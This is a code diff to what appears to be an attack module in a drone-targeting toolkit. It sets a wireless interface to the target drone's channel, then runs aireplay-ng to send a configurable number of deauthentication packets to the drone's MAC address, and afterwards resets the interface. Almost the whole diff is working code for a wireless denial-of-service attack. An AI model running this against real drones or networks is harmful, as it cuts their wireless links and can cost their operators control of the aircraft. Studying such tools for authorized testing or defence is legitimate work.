@@ -18,12 +18,16 @@ target_info = scan_info.get("target_info", {})
 target_mac = target_info.get("mac_address")
 target_channel = target_info.get("channel")
 
+options_info = scan_info.get("options", {})
+packets = options_info.get("packets")
+interface = options_info.get("interface")
+
 ##################
 ## START MODULE ##
 ##################
 
 # Targeting specific channel of target drone
-sudo_exec(f"iwconfig wlan0 channel {target_channel}")
+sudo_exec(f"iwconfig {interface} channel {target_channel}")
 
 # Deauth attack command
 
@@ -34,4 +38,9 @@ sudo_exec(f"iwconfig wlan0 channel {target_channel}")
 # target_mac : Target BSSID (MAC) from input file
 # wlan0 : Network interface to use
 
-sudo_exec(f"aireplay-ng -0 15 -a {target_mac}, wlan0")
+sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")
+
+# RESET interface after attack
+sudo_exec(f"ifconfig {interface} down")
+sudo_exec(f"iwconfig {interface} mode managed")
+sudo_exec(f"ifconfig {interface} up")
